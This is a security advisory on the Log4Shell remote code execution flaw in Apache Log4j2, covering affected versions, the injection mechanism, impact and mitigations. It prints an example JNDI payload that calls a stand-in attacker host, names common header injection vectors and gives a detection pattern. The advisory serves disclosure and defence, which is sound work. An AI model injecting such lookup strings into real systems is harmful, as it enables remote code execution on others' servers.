---
title: "CVE-2021-44228 — Apache Log4j2 Remote Code Execution (Log4Shell)"
published_date: 2021-12-10
last_modified: 2022-01-10
---

# Apache Log4j2 — Log4Shell Remote Code Execution

Apache Log4j2 is a widely-used Java logging framework. CVE-2021-44228, publicly disclosed in December 2021, is a critical unauthenticated remote code execution vulnerability triggered when Log4j2 logs an attacker-controlled string containing a JNDI lookup expression such as `${jndi:ldap://attacker.com/a}`. Affected versions span Log4j2 2.0-beta9 through 2.14.1. The vulnerability was discovered by the Alibaba Cloud Security Team and disclosed to Apache. CVSS score: 10.0 (Critical).

## Technical Details

Log4j2's message lookup substitution feature processes `${...}` expressions during log formatting. The JNDI (Java Naming and Directory Interface) lookup handler supports LDAP, RMI, DNS, and other protocols. When a log message includes a crafted JNDI URI, Log4j2 performs an outbound connection to the attacker-controlled server and deserializes the response object. Any application that logs user-supplied input — HTTP headers, form fields, User-Agent strings — is potentially vulnerable. The `X-Api-Version`, `User-Agent`, `X-Forwarded-For`, and similar HTTP headers were common injection vectors during mass exploitation. Exploit code reached public availability within hours of disclosure.

## Impact

CVE-2021-44228 allows pre-authentication remote code execution on any system running a vulnerable Log4j2 version. Because Log4j2 is embedded in thousands of products including VMware vCenter, Cisco products, Elasticsearch, and countless custom Java applications, the blast radius was enormous. Attackers can achieve full shell access, deploy ransomware, install cryptominers, or establish persistent backdoors. Post-exploitation activity was observed from multiple nation-state threat actors within days of public disclosure.

## Mitigation

Upgrade to Log4j2 2.17.1 (Java 8) or later. For immediate workarounds: set the JVM flag `-Dlog4j2.formatMsgNoLookups=true`, remove the `JndiLookup` class from the classpath, or set environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`. Network-level mitigation includes blocking outbound LDAP/RMI connections and inspecting WAF rules for JNDI patterns. Detection relies on scanning logs for `${jndi:` strings and monitoring outbound LDAP traffic.
